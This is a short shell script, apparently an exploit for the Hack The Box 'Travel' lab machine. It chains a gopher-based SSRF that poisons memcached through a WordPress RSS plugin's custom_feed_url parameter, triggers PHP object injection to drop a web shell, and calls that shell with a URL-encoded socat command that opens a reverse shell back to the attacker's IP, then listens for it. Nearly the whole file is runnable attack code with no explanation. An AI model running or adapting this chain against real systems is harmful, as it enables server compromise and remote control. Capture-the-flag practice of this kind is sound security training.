#!/bin/sh

GREEN="\e[0;32m"
CLEAR="\e[m"

# Get our IP on HTB
htbip=$(ifconfig | grep "destination 10.10" | sed 's/.*destination //')
echo "htb ip ${htbip}"

# Doesn't really matter what this, as long as its consistent, but if you've got your own
# server running you can verify it's being hit
feed_url="http://${htbip}/feed.html"

# Use our php script to generate the injection payload
payload_url=$(php gen-payload-only.php ${feed_url})

echo "${GREEN}- setting memcached value via gopher${CLEAR} ${payload_url}"
curl --silent "http://blog.travel.htb/awesome-rss/?custom_feed_url=${payload_url}" > /dev/null

echo "${GREEN}- sending request for for feed url to initiate object injection..."
curl --silent "http://blog.travel.htb/awesome-rss/?custom_feed_url=${feed_url}" > /dev/null

echo "- using created file to initiate reverse shell...${CLEAR}"
curl --silent "http://blog.travel.htb/wp-content/themes/twentytwenty/logs/rs.php?1=socat%20exec%3A%27bash%20%2Dli%27%2Cpty%2Cstderr%2Csetsid%2Csigint%2Csane%20tcp%3A${htbip}%3A22473" & > /dev/null

# catch reverse shell
socat file:`tty`,raw,echo=0 tcp-listen:22473